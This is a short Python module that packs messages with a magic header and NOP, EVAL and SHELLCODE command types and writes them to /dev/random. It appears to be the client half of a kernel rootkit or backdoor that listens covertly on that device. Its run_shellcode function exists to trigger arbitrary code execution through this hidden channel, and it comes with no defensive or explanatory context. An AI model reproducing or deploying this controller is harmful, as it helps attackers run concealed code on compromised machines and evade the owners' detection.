import struct
from enum import Enum

DEVICE_NAME = '/dev/random'


class CommandTypes(Enum):
    NOP = 0x00
    EVAL = 0x01
    SHELLCODE = 0x02


class Message:
    MAGIC = 0x41424344

    def __init__(self, command, payload=b''):
        self._command = command.value
        self._payload = payload

    def __bytes__(self):
        header = struct.pack(
            '<IIH',
            self.MAGIC,
            self._command,
            len(self._payload)
        )
        return header + self._payload


class ShellcodeMessage(Message):
    def __init__(self, shellcode):
        payload = shellcode
        super().__init__(CommandTypes.SHELLCODE, payload)


def run_shellcode(shellcode):
    message = ShellcodeMessage(shellcode)

    f = open(DEVICE_NAME, 'wb')
    f.write(bytes(message))
    f.close()
